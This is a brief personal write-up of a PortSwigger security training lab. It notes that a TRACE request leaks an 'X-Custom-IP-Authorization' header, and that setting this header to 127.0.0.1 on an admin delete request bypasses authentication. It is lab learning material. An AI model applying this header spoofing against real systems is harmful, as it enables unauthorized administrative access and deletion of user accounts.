# Authentication bypass via information disclosure

[Lab](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass)

- Sending `TRACE /login HTTP 1.1`, server responded with `X-Custom-IP-Authorization: 179.55.106.85` header
- Just add `X-Custom-IP-Authorization: 127.0.0.1` header to `GET /admin/delete?username=carlos` request